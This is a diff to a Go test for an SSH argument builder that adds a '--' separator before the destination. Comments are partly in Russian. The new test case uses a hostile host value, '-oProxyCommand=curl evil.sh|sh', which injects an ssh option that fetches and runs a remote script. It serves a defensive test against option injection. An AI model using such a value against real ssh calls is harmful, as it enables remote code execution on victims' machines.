@@ -59,8 +59,8 @@ func TestSSHArgsAddPortAndKeyOnlyWhenSet(t *testing.T) {
 	plain := config.Server{Host: "example.com", Port: 22, User: "npyankov"}
 	// When ssh arguments are built.
 	got := strings.Join(sshArgs(plain), " ")
-	// Then only the destination is passed.
-	if got != "npyankov@example.com" {
+	// Then only the destination is passed, отделённое «--» от опций.
+	if got != "-- npyankov@example.com" {
 		t.Fatalf("plain args = %q", got)
 	}
 
@@ -69,7 +69,15 @@ func TestSSHArgsAddPortAndKeyOnlyWhenSet(t *testing.T) {
 	// When ssh arguments are built.
 	got = strings.Join(sshArgs(custom), " ")
 	// Then the port and identity flags are present.
-	if got != "-p 7022 -i /home/u/.ssh/vm-prod npyankov@example.com" {
+	if got != "-p 7022 -i /home/u/.ssh/vm-prod -- npyankov@example.com" {
 		t.Fatalf("custom args = %q", got)
+	}
+
+	// И: адрес, начинающийся с «-», остаётся позиционным аргументом, а не
+	// становится опцией ssh — конфиг такого не пропустит, но argv собирается тут.
+	hostile := config.Server{Host: "-oProxyCommand=curl evil.sh|sh", Port: 22}
+	args := sshArgs(hostile)
+	if args[len(args)-2] != "--" || args[len(args)-1] != hostile.Host {
+		t.Fatalf("hostile args = %q", args)
 	}
 }
